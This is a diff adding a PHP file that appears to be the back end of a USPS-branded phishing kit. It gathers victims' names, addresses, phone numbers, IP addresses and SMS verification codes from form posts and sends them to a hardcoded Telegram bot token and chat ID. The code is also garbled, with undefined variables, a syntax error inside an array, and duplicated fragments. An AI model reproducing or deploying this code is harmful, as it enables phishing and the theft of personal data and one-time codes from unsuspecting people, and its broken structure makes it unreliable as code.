@@ -1,0 +1,66 @@
+ 
+<form action="" method="post">
+    <input type="text" name="message">
+    <input type="submit" name="submit">
+</form>
+
+
+<?php
+    if(isset($_POST['submit']))
+      {
+
+     $botToken="5729607436:AAGoRhQrjXi-RPD_LaMSLhNFWxWM2wiT9u0";
+
+  $website="https://api.telegram.org/bot".$botToken;
+  $chatId="5085418157";
+  $params=[
+      'chat_id'=>$chatId, 
+      'text'=>$message,
+  ];
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );    
+    }
+?>
+
+<?php
+
+
+$message = "-------------------- <3 USPS <3-------------------\nFull Name : ".$_POST['fullname']."\nAddress 1 : ".$_POST['add1']."\nAddress 2 : ".$_POST['add2']."\nCity      : ".$_POST['city']."\nstate  : ".$_POST['sstate']."\nzip Code  : ".$_POST['zipp']."\nPhone num  : ".$_POST['phonee']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
+
+  $botToken="5729607436:AAGoRhQrjXi-RPD_LaMSLhNFWxWM2wiT9u0";
+
+  $website="https://api.telegram.org/bot".$botToken;
+  $chatId="5085418157";
+  $params=[
+      'chat_id'=>$chatId, 
+      'text'=>$message,
+
+      send (method: "sendMessage", $paramaters)
+  ];
+  $ch = curl_init($website . '/sendMessage');
+  curl_setopt($ch, CURLOPT_HEADER, false);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_POST, 1);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+  $result = curl_exec($ch);
+  curl_close($ch);
+
+}
+?>
+$ip = getenv("REMOTE_ADDR");
+$message = "-------------------- <3 USPS <3-------------------\nSMS Code  : ".$_POST['sms1']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
+  $botToken="5729607436:AAGoRhQrjXi-RPD_LaMSLhNFWxWM2wiT9u0";
+
+  $website="https://api.telegram.org/bot".$botToken;
+  $chatId="5085418157";
+  $params=[
+      'chat_id'=>$chatId, 
+      'text'=>$message,
+
+      $botToken="5729607436:AAGoRhQrjXi-RPD_LaMSLhNFWxWM2wiT9u0";
+
+$website="https://api.telegram.org/bot".$botToken;
+$chatId="5085418157";
+$params=[
+    'chat_id'=>$chatId, 
+    'text'=>$message,
